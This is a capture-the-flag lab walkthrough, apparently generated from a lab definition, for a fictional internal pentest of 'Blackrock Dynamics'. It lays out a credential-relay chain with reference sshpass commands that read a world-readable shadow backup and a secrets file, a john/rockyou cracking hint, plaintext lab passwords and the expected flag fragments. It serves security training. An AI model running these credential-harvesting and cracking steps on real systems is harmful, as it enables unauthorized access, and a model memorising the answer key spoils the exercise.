# Blackrock Dynamics - Hash Relay

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `linux-3-4-hash-relay/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **Blackrock Dynamics - Hash Relay** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **50 minutes** · Difficulty: **intermediate**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

Blackrock Dynamics, a defense contractor in Arlington, Virginia, hired your
team at Vanguard Offensive Security for an internal penetration test. Phase 1
is complete - your team recovered SSH credentials for a low-privilege operator
account on one of their internal Linux servers.

Your objective for Phase 2 is to demonstrate the impact of poor credential
hygiene and insecure file permissions. Starting from the operator account, find
a path to the devops account and recover the assessment flag.

Marcus Webb (Infrastructure Lead) noted during the scoping call: "We had a
backup script running under cron that copies sensitive files around. I disabled
it, but I'm not sure the old copies were cleaned up. The dev team also keeps
password files in odd places - I've told them to stop, but you know how it is."

Standard rules of engagement apply. Document the full credential chain.

**Credentials**

- Target SSH: `operator` / `Bl4ckr0ck_0ps#`

## Your Objectives

- Discover an exposed shadow backup file through filesystem enumeration
- Crack the MD5-based password hash for the engineer account
- Pivot laterally using credentials found in the engineer's home directory
- Access the devops account and capture the flag
- Demonstrate a full credential relay chain from initial access to objective

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**SSH access as operator**

```bash
sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@<target> 'whoami' 2>&1
```

Expected: `operator`

**Discover exposed shadow backup**

```bash
sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@<target> 'cat /opt/blackrock/backups/shadow.bak | grep engineer | cut -d: -f1' 2>&1
```

Expected: `engineer`

**Read token 1 from backup directory**

```bash
sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@<target> 'cat /opt/blackrock/backups/assessment_marker.txt' 2>&1
```

Expected: `h4sh_r3l4y`

**SSH as engineer and read secrets.txt**

```bash
sshpass -p 'security' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer@<target> 'cat /home/engineer/secrets.txt' 2>&1
```

Expected: `Bl4ckr0ck_D3v#`

**SSH as devops and read flag**

```bash
sshpass -p 'Bl4ckr0ck_D3v#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null devops@<target> 'cat /home/devops/flag.txt' 2>&1
```

Expected: `ch41n`

**Verify assembled flag**

```bash
echo 'OCR{...}'
```

Expected: `OCR{`


### Hint ladder

<details><summary>Hint 1 (unlocks after 15 minutes)</summary>

Start by enumerating the filesystem for backup files and sensitive data.
Look in common locations like /opt, /var/backups, and /tmp. Files named
shadow, passwd, or anything with .bak are high-value targets. Check file
permissions - a world-readable shadow backup is a serious finding.

</details>

<details><summary>Hint 2 (unlocks after 25 minutes)</summary>

There is a shadow backup at /opt/blackrock/backups/shadow.bak that is
world-readable. Extract the engineer user's hash and crack it with john:
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.bak
The engineer's password is weak and will crack quickly. Once cracked,
switch to the engineer account and look for credential files.

</details>

<details><summary>Hint 3 (unlocks after 35 minutes)</summary>

After cracking the engineer hash, log in as engineer and check their
home directory. There is a secrets.txt file containing credentials for
the devops account. Use those credentials to log in as devops and read
the flag from their home directory. The full flag is assembled from
tokens found along the relay chain.

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
